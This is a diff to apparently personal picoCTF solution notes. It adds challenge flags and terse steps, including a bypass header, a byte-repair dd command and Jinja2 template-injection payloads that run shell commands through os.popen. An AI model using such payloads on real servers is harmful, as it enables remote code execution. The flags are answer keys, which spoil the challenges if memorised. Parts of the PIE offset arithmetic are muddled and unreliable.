@@ -68,4 +68,29 @@ UwkkM+srAQK+sVVR0Qbl0yU=
     3.  picoCTF{h1dd3n_1n_1m4g3_656e4d79}
 
 19. Flag in Flame -> picoCTF{forensics_analysis_is_amazing_ac1e3584}
-20. 
+20. Crack the Gate 1 -> picoCTF{brut4_f0rc4_83812a02}
+    1.  ctf-player@picoctf.org
+    2.  NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
+    3.  picoCTF{brut4_f0rc4_83812a02}
+
+21. Corrupted file -> picoCTF{r3st0r1ng_th3_by73s_b67c1558}
+    1.  `printf '\xFF\xD8' | dd of=img.jpg bs=1 seek=0 count=2 conv=notrunc`
+
+22. DISKO 1 -> picoCTF{1t5_ju5t_4_5tr1n9_c63b02ef}
+23. SSTI1 -> picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
+    1.  SECRET_KEY': None
+    2.  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
+    3.  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
+    4.  picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
+
+24. PIE TIME -> picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_fec8b8c5}
+    1.  000000000000133d T main
+    2.  00000000000012a7 T win
+        1.  main_offset = 0x133d
+        2.  win_offset =  0x12a7
+        3.  difference = 0x12a7 - 0x133d
+            1.  runtime_win = runtime_main + (win_offset - main_offset) 
+            2.  rintime_win = 0x5a4e82fec33d + (0x12a7 - 0x133d)
+            3.  runtime_win = 99293251683133 + (4775 - 4925) = -150
+            4.  12a7 – 133d = -96 = 0x96
+            5.  0x5e213ed5733d - 0x96 = 5E213ED572A7
